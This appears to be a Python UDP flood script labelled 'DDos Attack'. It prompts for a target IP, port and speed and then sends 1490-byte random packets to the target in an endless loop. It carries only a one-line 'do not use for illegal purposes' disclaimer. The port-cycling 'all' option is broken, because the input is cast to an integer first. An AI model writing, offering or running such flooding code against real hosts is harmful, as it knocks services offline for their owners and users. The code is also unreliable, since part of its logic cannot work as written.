# python3

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|   writer          : punzhou                       |")
print ("|   github    : https://github.com/qe4833/ddos    |")
print ("|   version          : V1.0.0                          |")
print ("\---------------------------------------------------/")
print (" ")
print (" -----------------[Do not use for illegal purposes]----------------- ")
print (" ")
ip = input("Please input IP     : ")
port = int(input("Please input Port ,if you want to attack each port, please enter all      : "))
speed = int(input("attack speed (0-1000) : "))

os.system("clear")

sent = 0
if port == "all":
     port = 1     
     while True:
          sock.sendto(bytes, (ip,port))
          sent = sent + 1
          port = port + 1
          print ("Has been sent %s data packet %s port %d"%(sent,ip,port))
          time.sleep((1000-speed)/2000)
          if port == 65535:
               port = 1
else:
     while True:
          sock.sendto(bytes, (ip,port))
          sent = sent + 1
          print ("Has been sent %s data packet %s port %d"%(sent,ip,port))
          time.sleep((1000-speed)/2000)
